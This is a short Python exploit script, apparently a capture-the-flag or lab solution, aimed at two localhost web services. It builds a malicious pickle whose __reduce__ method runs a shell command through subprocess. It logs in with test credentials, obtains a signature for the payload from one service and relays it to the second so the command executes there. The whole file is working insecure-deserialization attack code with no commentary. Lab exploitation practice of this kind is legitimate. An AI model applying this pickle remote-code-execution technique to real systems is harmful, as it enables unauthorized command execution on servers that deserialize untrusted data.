import requests
import pickle
import subprocess

CMD = ('/bin/sh','-c','ls -la /;',)

TARGET = 'http://localhost:6001'
TARGET2 = 'http://localhost:6002'
CREDS = ('test','test')

class RunCmd(object):
    def __reduce__(self):
        return (subprocess.check_output, (CMD,))

pl = 'STORE.pl.'+pickle.dumps(RunCmd())

s = requests.session()

s.post(TARGET+'/login',data={'username':CREDS[0],'password':CREDS[1]})

sig = s.post(TARGET+'/api/share',json={'name':pl}).json()['sig']
s.post(TARGET2+'/action',json={'action':sig})
action = s.post(TARGET+'/api/get',json={'name':'pl'}).json()['action']
res = s.post(TARGET2+'/action',json={'action':action}).text
print res


